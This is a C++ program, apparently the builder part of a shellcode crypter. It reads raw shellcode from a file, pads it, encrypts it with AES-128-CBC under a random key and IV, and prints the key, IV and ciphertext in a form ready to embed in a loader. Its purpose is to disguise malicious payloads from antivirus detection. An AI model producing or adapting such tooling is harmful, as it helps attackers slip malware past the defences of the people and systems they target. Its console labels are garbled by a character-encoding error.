#include <windows.h>
#include "AES.h"
#include <iostream>
#include <fstream>
#include <vector>
#include <random>
using namespace std;

// Function to generate a random AES key or IV
void generateRandomBytes(unsigned char* buffer, int length) {
    random_device rd;
    mt19937 gen(rd());
    uniform_int_distribution<> dis(0, 255);

    for (int i = 0; i < length; ++i) {
        buffer[i] = dis(gen);
    }
}

// Function to read shellcode from a file
vector<unsigned char> readShellcode(const string& filename) {
    ifstream file(filename, ios::binary);
    vector<unsigned char> shellcode;

    if (file.is_open()) {
        file.unsetf(ios::skipws);
        streampos fileSize;
        file.seekg(0, ios::end);
        fileSize = file.tellg();
        file.seekg(0, ios::beg);

        shellcode.reserve(fileSize);
        shellcode.insert(shellcode.begin(),
            istream_iterator<unsigned char>(file),
            istream_iterator<unsigned char>());
        file.close();
    }
    else {
        cerr << "Failed to open shellcode file." << endl;
        exit(EXIT_FAILURE);
    }

    return shellcode;
}

void printArrayAsHex(const unsigned char* array, int length, const string& name) {
    cout << "unsigned char " << name << "[] = { ";
    for (int i = 0; i < length; ++i) {
        printf("0x%02x", array[i]);
        if (i < length - 1) {
            cout << ", ";
        }
    }
    cout << " };" << endl;
}

int main() {
    // Read shellcode from file
    vector<unsigned char> plain = readShellcode("shellcode.bin");

    int plain_size = plain.size();
    if (plain_size % 16 != 0) {
        plain_size += (16 - (plain_size % 16));
        plain.resize(plain_size, 0); // Padding with zeros
    }

    cout << "Ã÷ÎÄ:";
    for (unsigned char byte : plain) {
        printf("%02x", byte);
    }
    cout << endl;

    // Generate random IV and Key
    unsigned char iv[16];
    unsigned char key[16];
    generateRandomBytes(iv, 16);
    generateRandomBytes(key, 16);

    // Print IV and Key in the specified format
    printArrayAsHex(iv, 16, "iv");
    printArrayAsHex(key, 16, "key");

    AES aes(AESKeyLength::AES_128);

    // Encrypt
    unsigned char* cipher = aes.EncryptCBC(plain.data(), plain_size, key, iv);
    cout << "ÃÜÎÄ:";
    for (int i = 0; i < plain_size; i++) {
        printf("\\x%02x", cipher[i]);
    }
    cout << endl;

    delete[] cipher;
    return 0;
}
